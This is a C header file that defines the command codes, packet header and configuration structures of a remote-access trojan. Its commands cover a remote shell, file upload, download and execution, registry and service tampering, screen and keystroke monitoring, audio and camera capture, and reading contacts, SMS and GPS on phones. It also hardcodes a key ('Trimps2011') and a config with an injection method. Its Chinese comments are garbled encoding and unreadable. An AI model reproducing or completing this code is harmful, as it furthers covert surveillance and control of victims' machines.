#ifndef MARCO_H
#define MARCO_H

#include <stdarg.h>
#include <windows.h>

////////////������ID////////////

//�������ӵ�ȷ�ϣ��ɼ�ض˷��͸�����ضˣ�
#define CONTROL_FEEDBACK		0x00ef				

//��ȡĿ����
#define CONTROL_GET_PLUGIN		0x00f0				

//����Ŀ����
#define CONTROL_UPDATE			0x00f1				

//ж��Ŀ����
#define CONTROL_UNINSTALL		0x00f2			

//��������KeepAlive
#define CONTROL_KEEPALIVE		0x00f3			

//����Ŀ�������Ļ�����Ϣ
#define CONTROL_QUERY_INFO		0x00f4

//����Ŀ�����
#define CONTROL_RESTART_SYSTEM	0x00f5

//�ر�Ŀ�����
#define CONTROL_SHUTDOWN_SYSTEM	0x00f6				

//��½�����������û���
#define CONTROL_LOGIN			0x00f7	

//ж������
#define CONTROL_REMOVE			0x00f8	

//ж������
#define CONTROL_CHANGE_TEXT		0x00f9	

//����Ŀ��������shell
#define CONTROL_REQUEST_SHELL	0x0101

//�г�����������
#define CONTROL_ENUM_DISKS		0x0201				

//�г�Ŀ¼
#define CONTROL_ENUM_FILES		0x0202				

//�������ļ�/Ŀ¼
#define CONTROL_RENAME_FILE		0x0203				

//ɾ���ļ�/Ŀ¼
#define CONTROL_DELETE_FILE		0x0204				

//�����ļ�
#define CONTROL_RUN_FILE		0x0205				

//�ϴ��ļ�/Ŀ¼
#define CONTROL_UPLOAD_FILE		0x0206				

//�����ļ�/Ŀ¼
#define CONTROL_DOWNLOAD_FILE	0x0207				

//�����ļ�/Ŀ¼
#define CONTROL_COPY_FILE		0x0208		

//�����ļ�/Ŀ¼
#define CONTROL_SEARCH_FILE		0x0209	

//����Ŀ¼
#define CONTROL_CREATE_DIR		0x020a	

//�ı䵱ǰĿ¼
#define CONTROL_CHANGE_DIR		0x020b

//�ļ���Ϣ
#define CONTROL_INFO_FILE		0x020c	

//�����ļ�Ŀ¼����
#define CONTROL_END_TRANSFER	0x020d


//���̹���
#define CONTROL_ENUM_PROCS		0x0301				

//ɱ������
#define CONTROL_KILL_PROCS		0x0302				


//�������
#define CONTROL_ENUM_SVCS		0x0401				
			
//��������
#define CONTROL_START_SVCS		0x0402				

//��ͣ����
#define CONTROL_PAUSE_SVCS		0x0403				

//ֹͣ����
#define CONTROL_STOP_SVCS		0x0404				

//��������
#define CONTROL_RESTART_SVCS	0x0405				

//�޸ķ���
#define CONTROL_MODIFY_SVCS		0x0406				


//��ѯָ����ֵ
#define CONTROL_REG_QUERY		0x0501				

//ɾ���Ӽ�
#define CONTROL_REG_DELETE_K	0x0502				

//���ļ�ֵ��
#define CONTROL_REG_RENAME_V	0x0503			

//ɾ����ֵ
#define CONTROL_REG_DELETE_V	0x0504				

//���ļ�ֵ
#define CONTROL_REG_EDIT_V		0x0505				

//�½���ֵ
#define CONTROL_REG_CREATE_V	0x0506			

//��Ļ���
#define CONTROL_MONITOR_SCREEN	0x0601			

//��Ļ��Ϣ
#define CONTROL_INFO_SCREEN		0x0602			

//��һ֡��Ļ
#define CONTROL_FIRST_SCREEN	0x0603			

//����֡��Ļ
#define CONTROL_NEXT_SCREEN		0x0604			

//�ر���Ļ���
#define CONTROL_CLOSE_SCREEN	0x0605		

//���̼��
#define CONTROL_MONITOR_KEY		0x0701	

//�������
#define CONTROL_AUDIO_INIT		0x0801	

//��������
#define CONTROL_AUDIO_DATA		0x0802	

//�ر��������
#define CONTROL_AUDIO_CLOSE		0x0803	

//��ѯ��ϵ��
#define CONTROL_QUERY_CONTACTS	0x0901

//���Ͷ���Ϣ
#define CONTROL_SEND_MESSAGE	0x0902

//��绰
#define CONTROL_DIAL_NUMBER		0x0903

//����ͷ����
#define CONTROL_CAMERA			0x0904

//GPS��λ
#define CONTROL_GPS				0x0905

//����Email
#define CONTROL_SEND_EMAIL		0x906

//��ҳ���
#define CONTROL_BROWSER			0x907


////////////�������////////////

//���Ҳ�֧�ָ�ģ��
#define ERR_NOTHISMODULE		0x0001

//����Ȩ�޲���
#define ERR_DENIED				0x0002

//�ļ��Ѿ�����
#define ERR_EXIST				0x0003

//�ļ�������
#define ERR_NOTFIND				0x0004

//��Ч����
#define ERR_INVPARA				0x0005

//��ʱ
#define ERR_TIMEOUT				0x0006

//ȡ������Ϣʧ��
#define ERR_FAILGETDISK			0x0007

//·��������
#define ERR_NOPATH				0x0008

//����ʧ��
#define ERR_FAILCONN			0x0009

//��������ʧ��
#define ERR_FAILJOB				0x000f

//δ֪����
#define ERR_UNKNOWN				0xffff


////////////����ϵͳ�б�////////////

//δ����
#define OS_NOTDEFINED			0x00

//WINDOWS
#define OS_WINDOWS				0x01

//Linux
#define OS_LINUX				0x02

//MAC OS
#define OS_MACOS				0x03

//Android
#define OS_ANDROID				0x04

//Windows Phone
#define OS_WINDOWS_PHONE		0x05

//Windows MOBILE
#define OS_WINDOWS_MOBILE		0x06

//IPhone
#define OS_IPHONE				0x07


//////////////////////////////////////////////////////////////////////////

#define MAGIC_ID "Win7"

struct control_header
{
	char magic[6];						//��ʶ
	
	unsigned short isCompressed:2;		//ѹ����־
	unsigned short reserved:14;
	
	unsigned char password[16];			//�������ΪGUID
	
	unsigned short seq;					//��ţ�������ڶ�����ݰ�������Ŵ�1��ʼ���������Ϊ0��
										//�ж϶���������ݰ�������dataLen�Ƿ�Ϊ-1��
	unsigned short timestamp;			//ʱ�����������֤���ݵ�
	
	unsigned short command;				//�����ʶ��
	unsigned short response;			//��Ӧ״̬
	
	int dataLen;						//�������ĳ���
};

#define FILL_MAGIC(package)		(strncpy((package).magic, MAGIC_ID, strlen(MAGIC_ID)))
#define ISVALID_HEADER(package)	(strncmp((package).magic, MAGIC_ID, strlen(MAGIC_ID)) == 0)
#define IS_PACKAGE_END(package)	((package).seq == 0 || ((package).dataLen == -1))

#define INITIALIZE_HEADER(cmd)  \
	{MAGIC_ID, 0, 0, "", 0, time(NULL)&0xffff, cmd, 0}

#define INITIALIZE_ENCYRPT_HEADER(cmd)  \
{MAGIC_ID, 1, 0, "", 0, time(NULL)&0xffff, cmd, 0}

#define INITIALIZE_COMPRESS_HEADER(cmd)  \
{MAGIC_ID, 2, 0, "", 0, time(NULL)&0xffff, cmd, 0}


#define REASSIGN_HEADER(package, cmd, status)  \
	(package).command = cmd; (package).response = status; (package).timestamp = time(NULL)&0xffff;


#define  myKey "Trimps2011"

//������Ϣ�б�
struct process_info
{
	unsigned long id;
	char name[64];
};

//�˿���Ϣ�б�
struct port_info     
{
	unsigned long processId;	//Process ID
	unsigned long port;			//Listen Port
	unsigned long addr;		//Listen Address
};

struct network_info
{
	char name[64];
	char ip[16];
	char gateway[16];
	char mask[16];
};

//ϵͳ������Ϣ
struct system_info
{
	//����ϵͳ��Ϣ
	union
	{
		struct
		{
			unsigned long majorVersion;
			unsigned long minorVersion;
			unsigned long platformId;
			unsigned long buildNumber;
			unsigned long productType;
		}windows;

		struct
		{
			unsigned long majorVersion;
			unsigned long minorVersion;
		}os;
	};
	
	unsigned long totalMemory;		//�ڴ�����
	unsigned long availMemory;		//�����ڴ�
	
	//CPU
	unsigned long cpuCount;			
	unsigned long cpuSpeed;
	char cpuDesc[64];

	//BIOS
	char biosDesc[32];
	
	//����������û���
	char computerName[64];
	char userName[64];
	char userGroupName[32];

	//ϵͳĿ¼��windowsĿ¼
	char sysDir[64];
	char winDir[32];

	int cntNW;
	struct network_info networks[0];
};


enum drive_type
{
	IS_UNKNOW,
	IS_REMOVABLE,
	IS_FIXED,
	IS_REMOTE,
	IS_CDROM,
	IS_RAM
};

enum drive_format
{
	FORMAT_UNKNOWN,
	FORMAT_NTFS,
	FORMAT_FAT32
};

//������Ϣ�Ľṹ
struct partition_info
{
	char			name[3];
	unsigned char	driveType:4;			//����������
	unsigned char	format:4;				// ��ʽ: NTFS/FAT32
	unsigned long	lowTotalBytes;		// ��������λ
	unsigned long	highTotalBytes;		// ��������λ	
	unsigned long	lowFreeBytes;		// ����������λ
	unsigned long	highFreeBytes;		// ����������λ
};

enum file_type{
	IS_FILE,
	IS_DIR
};

//Ŀ¼/�ļ���Ϣ
struct dir_info
{
	enum file_type		fileType;	// �ļ�����
	char				name[256];	// �ļ���

	// ���һ���޸�ʱ��
	unsigned long		lowDateTime;
	unsigned long		highDateTime;

	//�ļ���С
	unsigned long		fileSizeLow;
	unsigned long		fileSizeHigh;

};

union fileop_info
{
	char fileName[512];		//�½�Ŀ¼���г�Ŀ¼,ɾ��,�ϴ�/���أ����У�ע����󶼲���\\��

	struct
	{
		char oldFile[256];	//ԭ���ļ�
		char newFile[256];	//�޸�֮����ļ�
	}renameInfo;

	struct
	{
		char oldFile[256];
		char newFile[256];
	}copyInfo;

	struct 
	{
		char dir[256];
		char pattern[256];
	}searchInfo;

	struct{
		char clientFile[256];	//�ͻ��˵�Ŀ���ļ�
		char trojanFile[256];	//ľ��˵�Ŀ���ļ�
		void* event;
	}ftpInfo;

};

//ľ��������������ӵ����ݸ�ʽ
struct keepalive_info
{
	unsigned short cmd;
	unsigned short reserved;
};

typedef char string_ip[32];

//ľ������������ø�ʽ
union client_cfg
{
	struct
	{
		char magic[8];				//���
		char clientIP[32];			//�ͻ���IP��������
		unsigned int port;			//�˿�
		unsigned int conn_type;		//��������,TCP����UDP
		char password[16];			//����
		char inject[32];			//ע�뷽ʽ
		char cmdModules[256];		//��֧�ֵ�dll����ģ�飬��|��Ϊ�ָ���
		void* reserved;
	}cfg1;
	
	unsigned char cfg2[512];
};

#define CFG_MAGIC "\x12\x34\x56\x78\x9A\xBC\xDE\xF0"

#if !defined(_CONSOLE) && !defined(KDEBUG)
static inline void KDebug(const char *fmt, ...)
{
	char output[4096];

	memset(output, 0, sizeof(output));
	va_list args;
	va_start(args, fmt);
	int n = _vsnprintf(output, sizeof(output), fmt, args);
	va_end(args);

	if(output[n - 1] != '\n')
		output[n] = '\n';
	OutputDebugStringA(output);
}
#else
#define KDebug printf
#endif

#endif